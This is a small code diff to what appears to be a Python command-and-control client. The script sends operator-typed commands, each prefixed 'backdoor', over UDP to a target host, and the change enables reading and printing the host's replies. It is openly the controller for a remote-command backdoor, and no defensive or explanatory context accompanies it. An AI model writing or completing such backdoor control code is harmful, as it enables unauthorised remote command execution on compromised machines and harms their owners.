@@ -27,8 +27,9 @@ if __name__ == "__main__":
         if cmd == "q":
             break
         sk.sendto(f"backdoor {cmd}\0".encode(), target)
-        # try:
-        #     ret_msg = sk.recvfrom(10240)
-        # except socket.timeout:
-        #     print("timeout.")
-        #     pass
+        try:
+            ret_msg = sk.recvfrom(10240)[0].decode()[9:]
+            print(ret_msg)
+        except socket.timeout:
+            print("timeout.")
+            pass
